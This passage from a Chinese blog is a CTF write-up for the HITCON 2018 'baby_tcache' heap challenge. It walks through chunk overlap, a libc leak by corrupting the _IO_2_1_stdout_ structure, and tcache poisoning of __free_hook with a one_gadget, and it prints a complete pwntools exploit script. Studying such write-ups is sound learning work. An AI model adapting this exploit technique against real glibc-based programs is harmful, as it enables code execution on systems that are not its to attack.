class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这个没啥好讲的，每次都得写</p>
<h4 id="这部分是构造overlap的"><a href="#这部分是构造overlap的" class="headerlink" title="这部分是构造overlap的"></a>这部分是构造overlap的</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>前面学过chunk extend部分，这部分应该很好理解，至于那里为什么是\x60\x06</p>
<blockquote>
<blockquote>
<blockquote>
<p>hex(0x500+0x30+0x40+0x50+0x60+0x40)<br>‘0x660’</p>
</blockquote>
</blockquote>
</blockquote>
<p>注意0x500这部分包括chunk的pre_size和size部分</p>
<p>计算的时候要算上chunk头部大小</p>
<h4 id="leak-libc-重点"><a href="#leak-libc-重点" class="headerlink" title="leak libc(重点)"></a>leak libc(重点)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x530</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">print(repr(info1))</span><br><span class="line">leak_libc = u64(info1)</span><br><span class="line">io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br></pre></td></tr></table></figure>

<ol>
<li>我们要将unsortbin移动到chunk2部分，所以总大小为0x500+0x30+0x10=0x540，所以malloc是0x530</li>
<li>delete(4)为了后面做准备</li>
<li>接下来要覆盖的后三位是0x760，这是不会改的，内存一个页是0x1000，后三位是固定的，所以需要爆破高位，我们爆破猜测为0，所以是0x0760，这里是chunk2的数据部分，本来是main_arena的数据的，现在修改他的低两个字节,需要改成<em>IO_2_1_stdout</em></li>
<li>tcache poisoning攻击</li>
<li>这里的为什么是fbad1800?以及0x3e大小，还有p64(0)如何来的？</li>
</ol>
<p>引用ctf-wiki</p>
<p>最终会调用到这部分代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)  </span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">      :</span><br><span class="line">      :</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                                <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                                <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>下面会以_IO_do_write相同的参数调用new_do_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">     ............</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></span><br></pre></td></tr></table></figure>

<p>我们目的是调用到_IO_SYSWRITE，所以要bypass前面的检查，结合起来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>

<p>上面这部分ctf-wiki讲过了不在重复叙述，我当初纠结的是puts究竟是如何泄露libc的，<br>我们要用的是_IO_SYSWRITE(fp, data, to_do)<br>这个函数最终对应到函数 write(fp-&gt;fileno, data, to_do)<br>程序执行到这里就会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址。</p>
<p>这部分过程建议读读这篇文章，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区</p>
<p><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a></p>
<p>所以会泄露出部分数据，逆着推导我们需要执行到这个函数，就需要bypass前面的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,  <span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处</span></span><br><span class="line">                                              <span class="comment">// 存在有价值的地址 （libc 地址）则可进行泄露</span></span><br><span class="line">                                              <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></span><br><span class="line">           f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了</p>
<p>在逆向回去就是flag检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"></span><br><span class="line">_flags = <span class="number">0xfbad0000</span>	<span class="comment">//高两个字节是magic不用管</span></span><br><span class="line">_flags &amp; = _IO_NO_WRITES = <span class="number">0</span></span><br><span class="line">_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">所以_flag的值为<span class="number">0x0</span>xfbad18*<span class="number">0</span>  *可以为任何数</span><br></pre></td></tr></table></figure>

<p>其实魔数部分改成什么都可以</p>
<p>原理讲通后就是测试了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，<br>后面接下来三个p64(0)覆盖</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure>

<p>最后覆盖一个低字节\x00到_IO_write_base，效果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x7f00898f0760</span><br><span class="line">0x7f00898f0760 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad1800	0x0000000000000000</span><br><span class="line">0x7f00898f0770 &lt;_IO_2_1_stdout_+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0780 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f00898f0700	0x00007f00898f07e3</span><br><span class="line">0x7f00898f0790 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f00898f07e3	0x00007f00898f07e3</span><br><span class="line">0x7f00898f07a0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007f00898f07e4	0x0000000000000000</span><br><span class="line">0x7f00898f07b0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f07c0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007f00898efa00</span><br><span class="line">0x7f00898f07d0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff</span><br><span class="line">0x7f00898f07e0 &lt;_IO_2_1_stdout_+128&gt;:	0x000000000a000000	0x00007f00898f18c0</span><br><span class="line">0x7f00898f07f0 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x00007f00898f0700</span><br><span class="line">0x7f00898f0700 &lt;_IO_2_1_stderr_+128&gt;:	0x0000000000000000	0x00007f00898f18b0</span><br><span class="line">0x7f00898f0710 &lt;_IO_2_1_stderr_+144&gt;:	0xffffffffffffffff	0x0000000000000000</span><br><span class="line">0x7f00898f0720 &lt;_IO_2_1_stderr_+160&gt;:	0x00007f00898ef780	0x0000000000000000</span><br><span class="line">0x7f00898f0730 &lt;_IO_2_1_stderr_+176&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f00898f0740 &lt;_IO_2_1_stderr_+192&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>所以可以泄露出libc地址了</p>
<h4 id="tcache-poisoning攻击"><a href="#tcache-poisoning攻击" class="headerlink" title="tcache poisoning攻击"></a>tcache poisoning攻击</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, content=<span class="string">'a'</span>)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">'Data:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Index:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">    new(<span class="number">0x40</span>) <span class="comment">#2</span></span><br><span class="line">    new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">    new(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">    new(<span class="number">0x500</span><span class="number">-0x8</span>) <span class="comment">#5</span></span><br><span class="line">    new(<span class="number">0x70</span>) <span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0x68</span>, <span class="string">"A"</span>*<span class="number">0x60</span> + <span class="string">'\x60\x06'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    new(<span class="number">0x530</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    new(<span class="number">0xa0</span>, <span class="string">'\x60\x07'</span>)</span><br><span class="line">    new(<span class="number">0x40</span>, <span class="string">'a'</span>)</span><br><span class="line">    new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)</span><br><span class="line">    print(repr(io.recv(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">'leak!!!!!'</span>)</span><br><span class="line">    info1 = io.recv(<span class="number">8</span>)</span><br><span class="line">    print(repr(info1))</span><br><span class="line">    leak_libc = u64(info1)</span><br><span class="line">    io.success(<span class="string">"leak_libc: 0x%x"</span> % leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3ed8b0</span></span><br><span class="line">    new(<span class="number">0xa0</span>, p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"A"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    <span class="comment">#one_gadget = 0x4f2c5 #</span></span><br><span class="line">    one_gadget = <span class="number">0x4f322</span> <span class="comment">#0x10a38c</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + one_gadget))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./baby_tcache'</span>)</span><br></pre></td></tr></table></figure>


<h3 id="调试总结"><a href="#调试总结" class="headerlink" title="调试总结"></a>调试总结</h3><p>这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用 </p>
<h4 id="查看内存部分"><a href="#查看内存部分" class="headerlink" title="查看内存部分"></a>查看内存部分</h4><p>想gdb调试查看这部分内存的话<br>new(0x3e, p64(0xfbad1800)+ p64(0)*3 + ‘\x00’)，<br>不要在之后下断，之后查看的话看不到<br>可以在这句话之前下断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b malloc</span><br><span class="line">finish</span><br><span class="line">n</span><br></pre></td></tr></table></figure>
<p>n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout</p>
<h4 id="gdb附加技巧"><a href="#gdb附加技巧" class="headerlink" title="gdb附加技巧"></a>gdb附加技巧</h4><p>这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口</p>
<h4 id="计算技巧"><a href="#计算技巧" class="headerlink" title="计算技巧"></a>计算技巧</h4><p>以前我经常用python计算offset，现在都是用gdb命令p  addr1-addr2</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>IO_FILE攻击还是nb,能利用基本函数泄露出libc</li>
<li>自己构造起overlap起来还是有点吃力，以后要多练习这部分内容</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">ctf-wiki</a><br><a href="http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/" target="_blank" rel="noopener">IO-FILE部分源码分析及利用</a><br><a href="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/" target="_blank" rel="noopener">2018-hitcon-baby-tcache_writeup</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-10/" class="post-title-link" itemprop="url">pwn堆入门系列教程10</a>
        </h1>

        <div class="post-meta">
